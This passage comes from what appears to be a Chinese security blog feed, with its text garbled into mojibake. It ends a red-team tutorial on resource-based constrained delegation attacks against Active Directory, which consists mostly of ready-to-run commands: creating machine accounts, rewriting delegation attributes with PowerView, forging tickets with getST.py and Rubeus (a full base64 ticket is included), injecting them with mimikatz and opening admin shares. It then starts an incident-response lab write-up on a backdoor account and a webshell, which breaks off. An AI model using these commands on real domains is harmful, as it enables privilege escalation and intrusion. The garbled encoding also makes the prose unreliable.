ç‰ˆæœ¬ï¼Œéƒ½æ–¹ä¾¿ CobaltStrike å†…å­˜åŠ è½½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharpmad.exe MAQ -Action new -MachineAccount test1 -MachinePassword pass@1234ï¼</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•ä¸‰ï¼š</strong><code>addcomputer.py</code> è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -computer-name machine1 -computer-pass 1qaz@WSX -dc-ip 192.168.11.11 attack.cn/zhang:321.com -method SAMR -debug</span><br><span class="line">æˆ–</span><br><span class="line">python3 addcomputer.py redteam.lab/ken:123.com -method LDAPS -computer-name CPT01\$ -computer-pass Passw0rd -dc-ip 10.10.2.20</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•å››ï¼š</strong>ä½¿ç”¨bloodyADå·¥å…·åˆ›å»ºæœºå™¨è´¦æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bloodyAD.py -d redteam.lab -u ken -p &#x27;123.com&#x27; --host 10.10.2.20 addComputer CPT01 &#x27;Passw0rd&#x27;</span><br></pre></td></tr></table></figure><h4 id="2ã€è·å–æ–°å¢æœºå™¨ç”¨æˆ·çš„SID"><a href="#2ã€è·å–æ–°å¢æœºå™¨ç”¨æˆ·çš„SID" class="headerlink" title="2ã€è·å–æ–°å¢æœºå™¨ç”¨æˆ·çš„SID"></a>2ã€è·å–æ–°å¢æœºå™¨ç”¨æˆ·çš„SID</h4><p>è·å–æ–°å»ºçš„æœºå™¨ç”¨æˆ·<code>test1$</code>çš„sid å€¼</p><p><strong>æ–¹å¼ä¸€ï¼š</strong>åŸºäº<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">Microsoft.ActiveDirectory.Management.dll at master Â· 3gstudent&#x2F;test</a>å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Get-MachineAccountAttribute -MachineAccount test1$ -Attribute servicePrincipalNameï¼ˆæ— è®ºæŠ¥é”™ï¼‰</span><br><span class="line">Get-ADComputer test1$ -Properties *</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240319175512306.png" alt="image-20240319175512306"></p><p><strong>æ–¹å¼äºŒï¼š</strong>ä½¿ç”¨PowerViewå·¥å…·æŸ¥è¯¢æœºå™¨è´¦æˆ·SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line">Get-NetComputer test1 -Properties objectsidï¼ˆè¿™é‡Œä¸åŠ $ï¼‰</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/image-20240320105221553.png" alt="image-20240320105221553"></p><h4 id="3ã€è®¾ç½®åŸºäºèµ„æºçš„å§”æ´¾å±æ€§"><a href="#3ã€è®¾ç½®åŸºäºèµ„æºçš„å§”æ´¾å±æ€§" class="headerlink" title="3ã€è®¾ç½®åŸºäºèµ„æºçš„å§”æ´¾å±æ€§"></a>3ã€è®¾ç½®åŸºäºèµ„æºçš„å§”æ´¾å±æ€§</h4><p>ä½¿ç”¨<code>PowerView</code>è„šæœ¬ä¿®æ”¹æœºå™¨ç”¨æˆ·çš„<code>msds-allowedtoactonbehalfofotheridentity</code>å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">import-module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;SIDå€¼&gt;&quot;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer &lt;ä¸»æœºåç§°&gt; | Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/6c2872a780d549f4a5d8ebd9b047b52a.png" alt="6c2872a780d549f4a5d8ebd9b047b"></p><p>æŸ¥è¯¢å±æ€§(åä¸€æ¡å‘½ä»¤ä½¿ç”¨åˆ°äº†ActiveDirectoryæ¨¡å—ï¼ŒåŸŸæ§é»˜è®¤å¸¦)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-DomainComputer SERVER2012 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/9322a358955243aaa4a10af37cf538c6.png" alt="9322a358955243aaa4a10af37cf538c6"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># åŸŸæ§æŸ¥è¯¢å‘½ä»¤</span><br><span class="line">Get-ADComputer SERVER2012 -Properties PrincipalsAllowedToDelegateToAccount</span><br><span class="line"># æ¸…é™¤å±æ€§</span><br><span class="line">Set-DomainObject SERVER2012 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure><h4 id="4ã€ç¥¨æ®ç”³è¯·"><a href="#4ã€ç¥¨æ®ç”³è¯·" class="headerlink" title="4ã€ç¥¨æ®ç”³è¯·"></a>4ã€ç¥¨æ®ç”³è¯·</h4><p><strong>æ–¹æ³•ä¸€ï¼š</strong></p><p>ä½¿â½¤ impacket çš„ <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py">getST.py</a> â½£æˆç¥¨æ®ï¼ˆå»ºè®®ä½¿â½¤ socks5ï¼‰ï¼Œä¼šåœ¨å½“å‰â½¬å½•ä¸‹â½£administrator.ccache â½‚ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install six pyasn1 impacket</span><br><span class="line">python getST.py -dc-ip 192.168.10.2 test.lab/test\$:123456 -spn cifs/ADMIN--PC.test.lab -impersonate administrator</span><br></pre></td></tr></table></figure><p><img src="/img/Intranet-Penetration-Delegation-attack/864b8f14979f4217bf2d096044ea6c39.png" alt="864b8f14979f4217bf2d096044ea6c39"></p><p>mimikatzå¯¼å…¥ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::ptc administrator.ccache&quot;</span><br></pre></td></tr></table></figure><p>æ³¨å…¥åï¼ŒæˆåŠŸè®¿é—®</p><p><img src="/img/Intranet-Penetration-Delegation-attack/54fd16ba239a40fb9af1400fde4f21c4.png" alt="54fd16ba239a40fb9af1400fde4f21c4"></p><p><strong>æ–¹æ³•äºŒï¼š</strong></p><p>ä½¿ç”¨Rubeusç”³è¯·ç¥¨æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># é€šè¿‡Rubeusç”³è¯·æœºå™¨è´¦æˆ·CPT01$çš„TGT</span><br><span class="line">Rubeus.exe asktgt /user:CPT01$ /password:Passw0rd /domain:redteam.lab /dc:DC2016.redteam.lab /nowrap</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨S4U2Selfåè®®ç”³è¯·TGSå¹¶ä¸”ä½¿ç”¨S4U2Proxyåè®®è¯·æ±‚cifsæœåŠ¡ç¥¨æ®STï¼Œæ³¨å…¥å†…å­˜ä¸­</span><br><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/SERVER2012.redteam.lab /dc:DC2016.redteam.lab /nowrap /ptt /ticket:doIE2DCCBNSgAwIBBaEDAgEWooID8jCCA+5hggPqMIID5qADAgEFoQ0bC1JFRFRFQU0uTEFCoiAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLmxhYqOCA6wwggOooAMCARKhAwIBAqKCA5oEggOWx0emir2j0Me0AEZiGIF6iCN9gm6S9/VwFmYy8F9s5+FFyHDmSWjfLJotWqg/BXyB94ueiRrMXRkOYhKxLfUaJ4OJyGLxTv/oHQ9eM5EBe1QG1h5IufgR6T0Z23wknxOQA/JOP32HIoroCn84tHHlWrDx8JVu2bCKqfR3pqmnQCZXfb/3ydfNeqdf3hlF917Py5cMWKtDWBiMUx9HdtGto3d65JDaZTvetV5inE3+Ze+Z+dt/pE7CGtO1CrXjBVKmZTDq6i6oxOlOPcZo30TTIF0DW2jQBH1fZmn4z6o7Wv8uD/SycHV+BXv9Yjv4b0ESAaqZ4zt+zNvcBT0jrGTgrdOmvgKuc3wM0uHvfOOShx+TBrmjYbnrjd1vyTSbq/q4Ugyon+0hsQng5Dxb78QwfukVyTGfKuEqp9ar63kav99xl7EJUyv+TfhJsbYWBRH0ebyVl62eFkDi+cgPFF3isvdNao8Oc6zu+JJzbV3XguPFtmJlBUGYP/IWfxkfRg24tYvo+gaYW3NCuvp/yavpCT9WakKmwhKpXPQlLVZ5dPIuBHfiYY9eCRBD7L5WtXhgRh3ELLhA7UAkB7Q8rB9kle3QIdnHdQMeqBTPvv3k5JC9yybtYOg184w00OR0MCO88697KcvS0mbUN30XRp0CMwKSmKftIPbMvGjflzm5yWypezJ/I7cNwh+NyaFP2WE0kSh0zjR7acFe7NzK6eGMpJCksEuTa1Gp6FpJ1g2g2s3UqWyIyJpT8Rw9x/VMSbInvgfZV649Doh6OjbYPvct3WplSOo+U12Abec+Dog4zg4kLhBQ9zx6I5YGOh1zscS5A9ig0lzt8ZTa+H4vG3UGy7QcDsy624pUZ5GM2vXgyPVmVKBUrLmRFjPqJKd2xW2D5Vve9vF9QD8ZiGjJkjawI1xoo4OyeuRO1QBWWaR2U7zyWnj/NRW0MeCQEvw9ay6MlT5/yLNf6XQG+2z/n1zrLYkOxjH7LhL6qFjPDA9ECzF+bBs09ahifFruIxLC24EjZNCJ42rWZig6MyOppUmSdpDCoBrX0Dtwmw+3rPTCkzlUSpSQ2Axf4EdrA8mFtY370uJLlPgqqiRQPOeM5lxGFfgxeYwwYUab96CTgfo1qRIAHxIYqGZ3Qb0B6EOMzjGLeyvfK5p8Uv9DT1M3kQJnAgi5rlrlt8KmYiYAhgLa/okVKSxUIjfE8rgLucKrRTz1k2NevBR3o4HRMIHOoAMCAQCigcYEgcN9gcAwgb2ggbowgbcwgbSgGzAZoAMCARehEgQQ75YaW7Y0HIYQtAyZ4UavYaENGwtSRURURUFNLkxBQqITMBGgAwIBAaEKMAgbBkNQVDAxJKMHAwUAQOEAAKURGA8yMDIyMDUxODE1MDg0MFqmERgPMjAyMjA1MTkwMTA4NDBapxEYDzIwMjIwNTI1MTUwODQwWqgNGwtSRURURUFNLkxBQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLcmVkdGVhbS5sYWI=</span><br><span class="line"></span><br><span class="line"># è®¿é—®</span><br><span class="line">dir \\SERVER2012.redteam.lab\c$</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://blog.csdn.net/qq_44159028/article/details/124118253">åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ”»å‡»-CSDNåšå®¢</a></p><p><a href="https://forum.butian.net/share/1591">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-çº¢é˜ŸåŸŸæ¸—é€æŠ€æœ¯ï¼šå§”æ´¾æ”»å‡»æ±‡æ€»ï¼ˆå…¨ï¼‰ (butian.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¨ªå‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åº”æ€¥é¶åœºã€‘Win Server Web2å…¥ä¾µæ’æŸ¥</title>
      <link href="/2024/03/04/Emergency-WinServer-web2/"/>
      <url>/2024/03/04/Emergency-WinServer-web2/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-Web2å…¥ä¾µæ’æŸ¥"><a href="#Windows-Server-Web2å…¥ä¾µæ’æŸ¥" class="headerlink" title="Windows Server Web2å…¥ä¾µæ’æŸ¥"></a>Windows Server Web2å…¥ä¾µæ’æŸ¥</h1><h1 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h1><p>å‰æ™¯éœ€è¦ï¼šå°æåœ¨æŸå•ä½é©»åœºå€¼å®ˆï¼Œæ·±å¤œ12ç‚¹ï¼Œç”²æ–¹å·²ç»å›å®¶äº†ï¼Œå°æåˆšå·å·<a href="https://so.csdn.net/so/search?q=%E6%91%B8%E9%B1%BC&spm=1001.2101.3001.7020">æ‘¸é±¼</a>åï¼Œå‘ç°å®‰å…¨è®¾å¤‡æœ‰å‘Šè­¦ï¼Œäºæ˜¯ç«‹åˆ»åœæ‰äº†æœºå™¨å¼€å§‹æ’æŸ¥ã€‚</p><p>ç½‘ç›˜ä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å‹åï¼Œåœ¨é«˜ç‰ˆæœ¬ï¼ˆå¤§äº17.5ï¼‰çš„VMä¸­æ‰«ææ‰“å¼€ã€‚è·å–æ‰€æœ‰æƒå¹¶å¼€å¯é¶æœºå³å¯</p><h1 id="äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥"><a href="#äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥" class="headerlink" title="äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥"></a>äºŒã€åé—¨ç”¨æˆ·æ’æŸ¥</h1><h3 id="1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥"><a href="#1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥" class="headerlink" title="1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥"></a>1ã€å‘½ä»¤ç®€å•çš„æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web2/image-20240303142420925.png" alt="image-20240303142420925"></p><h3 id="2ã€æ§åˆ¶é¢æ¿æ’æŸ¥"><a href="#2ã€æ§åˆ¶é¢æ¿æ’æŸ¥" class="headerlink" title="2ã€æ§åˆ¶é¢æ¿æ’æŸ¥"></a>2ã€æ§åˆ¶é¢æ¿æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303142855629.png" alt="image-20240303142855629"></p><h3 id="3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥"><a href="#3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥" class="headerlink" title="3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥"></a>3ã€æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143028250.png" alt="image-20240303143028250"></p><p>æ‰¾åˆ°å…‹éš†åé—¨ç”¨æˆ·<code>hack897$</code></p><h3 id="4ã€æ³¨å†Œè¡¨æ’æŸ¥"><a href="#4ã€æ³¨å†Œè¡¨æ’æŸ¥" class="headerlink" title="4ã€æ³¨å†Œè¡¨æ’æŸ¥"></a>4ã€æ³¨å†Œè¡¨æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143208310.png" alt="image-20240303143208310"></p><p>é€šè¿‡Fé”®å¯¹æ¯”ï¼Œè¯¥éšè—ç”¨æˆ·å±äºæ˜¯å…‹éš†ç®¡ç†å‘˜åé—¨ç”¨æˆ·</p><p><img src="/img/Emergency-WinServer-web2/image-20240303150406355.png" alt="image-20240303150406355"></p><h1 id="ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"><a href="#ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥" class="headerlink" title="ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥"></a>ä¸‰ã€ç«¯å£ã€è¿›ç¨‹æ’æŸ¥</h1><h3 id="1ã€ç«¯å£è¿æ¥æ’æŸ¥"><a href="#1ã€ç«¯å£è¿æ¥æ’æŸ¥" class="headerlink" title="1ã€ç«¯å£è¿æ¥æ’æŸ¥"></a>1ã€ç«¯å£è¿æ¥æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143441115.png" alt="image-20240303143441115"></p><p>ä¸æŸç«¯å£çš„443ç«¯å£å¤„äºç­‰å¾…å…³é—­çš„çŠ¶æ€</p><h3 id="2ã€è¿›ç¨‹æ’æŸ¥"><a href="#2ã€è¿›ç¨‹æ’æŸ¥" class="headerlink" title="2ã€è¿›ç¨‹æ’æŸ¥"></a>2ã€è¿›ç¨‹æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303143725691.png" alt="image-20240303143725691"></p><p>7136è¿›ç¨‹æ˜¯ç”±äºæˆ‘å¼€äº†ä¸€ä¸ªåº”æ€¥æ’æŸ¥å·¥å…·çš„åŸå› ï¼Œå¹¶éæ¶æ„è¿›ç¨‹</p><h1 id="å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥"><a href="#å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥" class="headerlink" title="å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥"></a>å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥</h1><h3 id="1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"><a href="#1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥" class="headerlink" title="1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"></a>1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥</h3><p>ã€æ§åˆ¶é¢æ¿ã€‘æœç´¢è®¡åˆ’ä»»åŠ¡ï¼Œæ­£å¸¸ä»»åŠ¡ï¼Œæ— åé—¨</p><p><img src="/img/Emergency-WinServer-web2/image-20240303143941060.png" alt="image-20240303143941060"></p><h3 id="2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥"><a href="#2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥" class="headerlink" title="2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥"></a>2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303144122716.png" alt="image-20240303144122716"></p><h3 id="3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥"><a href="#3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥" class="headerlink" title="3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥"></a>3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303144206758.png" alt="image-20240303144206758"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303144308675.png" alt="image-20240303144308675"></p><h3 id="4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥"><a href="#4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥" class="headerlink" title="4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥"></a>4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥</h3><p>æœ‰ä¼—å¤šå¯åŠ¨ä¸œæ³¨å†Œè¡¨é¡¹ï¼Œä¸ä¸€ä¸€å±•ç¤ºäº†ï¼Œå‡æ— åé—¨å­˜åœ¨</p><p><img src="/img/Emergency-WinServer-web2/image-20240303144422074.png" alt="image-20240303144422074"></p><p>è‡ªå¯åŠ¨å‡æ­£å¸¸ï¼Œå¹¶æ— åé—¨å­˜åœ¨</p><h1 id="äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥"><a href="#äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥" class="headerlink" title="äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥"></a>äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥</h1><h3 id="1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥"><a href="#1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥" class="headerlink" title="1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥"></a>1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4624ï¼šæˆåŠŸç™»å½•çš„è´¦æˆ·ã€‚</span><br><span class="line">4625ï¼šç™»å½•å¤±è´¥çš„å°è¯•ã€‚</span><br><span class="line">4672ï¼šæˆäºˆäº†ç‰¹æ®Šæƒé™ã€‚</span><br><span class="line">4720ï¼šè´¦æˆ·åˆ›å»ºã€‚</span><br><span class="line">4722ï¼šè´¦æˆ·å¯ç”¨ã€‚</span><br><span class="line">4723ï¼šè´¦æˆ·ç¦ç”¨ã€‚</span><br><span class="line">4724ï¼šå¯†ç æ›´æ”¹ã€‚</span><br><span class="line">4725ï¼šå¯†ç é‡ç½®ã€‚</span><br><span class="line">4726ï¼šè´¦æˆ·åˆ é™¤ã€‚</span><br><span class="line">4738ï¼šç”¨æˆ·è´¦æˆ·æ›´æ”¹ã€‚</span><br><span class="line">4739ï¼šç”¨æˆ·ç»„æ›´æ”¹ã€‚</span><br><span class="line">4762ï¼šç”¨æˆ·ç»„æ·»åŠ æˆ–åˆ é™¤æˆå‘˜ã€‚</span><br></pre></td></tr></table></figure><p>é€šè¿‡4720 ç­›é€‰åˆ›å»ºç”¨æˆ·çš„æ—¶é—´å’Œç”¨æˆ·å</p><p><img src="/img/Emergency-WinServer-web2/image-20240303145058321.png" alt="image-20240303145058321"></p><h3 id="2ã€Webæ—¥å¿—æ’æŸ¥"><a href="#2ã€Webæ—¥å¿—æ’æŸ¥" class="headerlink" title="2ã€Webæ—¥å¿—æ’æŸ¥"></a>2ã€Webæ—¥å¿—æ’æŸ¥</h3><p>æ—¥å¿—ä¸å¤§ï¼Œä½¿ç”¨<a href="https://tilipa.zlsam.com/loger/">åœ¨çº¿æ—¥å¿—åˆ†æå·¥å…·</a> è¿›è¡Œäººå·¥æ—¥å¿—åˆ†æ</p><p>web å±äºæ˜¯php çš„wordpress åšå®¢æ¡†æ¶</p><p><img src="/img/Emergency-WinServer-web2/image-20240303145453581.png" alt="image-20240303145453581"></p><p>ä»47 æ¡å¼€å§‹å‡ºç°äº†å¤–éƒ¨IP<code>192.168.126.135</code></p><p><img src="/img/Emergency-WinServer-web2/image-20240303145544714.png" alt="image-20240303145544714"></p><p>è¯¥IP ä¸€ç›´åœ¨ç»è¿‡åœ°å€è®¿é—®ï¼Œé€šè¿‡è§‚å¯Ÿè¯·æ±‚çš„è·¯å¾„å¯ä»¥æŸ¥çœ‹ï¼Œè¯¥IP åœ¨è¿›è¡Œç›®å½•çˆ†ç ´ï¼Œå¯»æ‰¾æ•æ„Ÿæ–‡ä»¶å’Œè·¯å¾„ï¼Œå› æ­¤å¯ä»¥çœ‹åˆ°è¯·æ±‚çš„å“åº”ç å¤§éƒ½æ˜¯404</p><p><img src="/img/Emergency-WinServer-web2/image-20240303151048120.png" alt="image-20240303151048120"></p><p>ä¸€ç›´åˆ°æœ€åç”¨postæ–¹å¼è®¿é—®äº†&#96;&#96;system.php<code> æ–‡ä»¶ï¼Œè€Œä¸Šä¸€æ­¥æ“ä½œç–‘ä¼¼æ˜¯è®¿é—®äº† logo çš„å›¾ç‰‡ï¼Œé‚£ä¹ˆè¯¥</code>system.php&#96; æ–‡ä»¶å¾ˆæœ‰å¯èƒ½æ˜¯æ”»å‡»è€…ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web2/image-20240303145717421.png" alt="image-20240303145717421"></p><p>é‚£ä¹ˆå¯¹äºæ­¤æ¬¡webæ”»å‡»ï¼Œ<code>system.php</code> æ–‡ä»¶å…·ä½“æ˜¯å¦‚ä½•è¢«æ”»å‡»è€…ä¸Šä¼ çš„ï¼Œæœ‰ç‚¹è®©äººæ‘¸ä¸åˆ°å¤´è„‘</p><h3 id="3ã€FTPæ—¥å¿—æ’æŸ¥"><a href="#3ã€FTPæ—¥å¿—æ’æŸ¥" class="headerlink" title="3ã€FTPæ—¥å¿—æ’æŸ¥"></a>3ã€FTPæ—¥å¿—æ’æŸ¥</h3><p>åœ¨æŸ¥çœ‹å°çš®çš„æ—¶å€™ç¿»åˆ°äº†FTP æœåŠ¡ï¼Œè€Œä¸”è¯¥FTP æœåŠ¡çš„æ ¹è·¯å¾„æŒ‚è½½åˆ°äº†www ç›®å½•ä¸‹ï¼Œè¿™æ˜¯ç›¸å½“å±é™©çš„åšæ³•ï¼Œæ‰¾åˆ°FTPæ—¥å¿—ï¼Œå¯¹FTP çš„æ—¥å¿—å†è¿›è¡Œä¸€æ¬¡å®¡è®¡</p><p><img src="/img/Emergency-WinServer-web2/image-20240303162527743.png" alt="image-20240303162527743"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303163950710.png" alt="image-20240303163950710"></p><p>å¯ä»¥çœ‹åˆ°webæ—¥å¿—å®¡è®¡ä¸­çš„æ¶æ„IP å‡ºç°åœ¨äº†FTP æ—¥å¿—ä¸­ï¼Œä¸”ä¸€ç›´åœ¨è¿›è¡Œè¿æ¥</p><p><img src="/img/Emergency-WinServer-web2/image-20240303162739392.png" alt="image-20240303162739392"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303163012441.png" alt="image-20240303163012441"></p><p>åœ¨çŸ­çŸ­çš„å‡ ç§’é’Ÿä¹‹å†…è¿›è¡Œäº†ä¸Šåƒæ¬¡ç™»é™†çš„å°è¯•ï¼Œç¡®è®¤è¯¥æ¶æ„IPè¿›è¡Œäº†ftp çˆ†ç ´è¡Œä¸ºï¼Œä¸”æœ€ç»ˆç»“æœçˆ†ç ´æˆåŠŸ</p><p>åœ¨è¯¥æ—¥å¿—çš„æœ€åæš´éœ²å‡ºæ¥<code>system.php</code> æ–‡ä»¶æ˜¯é€šè¿‡ftp è¿›è¡Œä¸Šä¼ æ¥çš„</p><p><img src="/img/Emergency-WinServer-web2/image-20240303163615882.png" alt="image-20240303163615882"></p><h1 id="å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥"><a href="#å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥" class="headerlink" title="å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥"></a>å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥</h1><p>åœ¨ä¸Šè¿°æ—¥å¿—æ’æŸ¥è¿‡ç¨‹ä¸­ï¼Œç–‘ä¼¼<code>system.php</code> æ–‡ä»¶å±äºwebshell æœ¨é©¬ï¼Œä½ç½®åœ¨webç½‘ç«™çš„æ ¹è·¯å¾„ï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶çš„å†…å®¹</p><p><img src="/img/Emergency-WinServer-web2/image-20240303150312238.png" alt="image-20240303150312238"></p><p>ç¡®è®¤æ˜¯æ¶æ„åé—¨è„šæœ¬æ–‡ä»¶</p><h1 id="ä¸ƒã€æº¯æºè¿½è¸ª"><a href="#ä¸ƒã€æº¯æºè¿½è¸ª" class="headerlink" title="ä¸ƒã€æº¯æºè¿½è¸ª"></a>ä¸ƒã€æº¯æºè¿½è¸ª</h1><p>æˆ‘ä»¬é€šè¿‡apache æ—¥å¿—çš„æœ€åï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ”»å‡»è€…è®¿é—®webshellæœ¨é©¬æ–‡ä»¶<code>system.php</code> æ–‡ä»¶ä¹‹åä¾ç„¶æ‰§è¡Œäº†å¾ˆå¤šæ“ä½œ</p><p><img 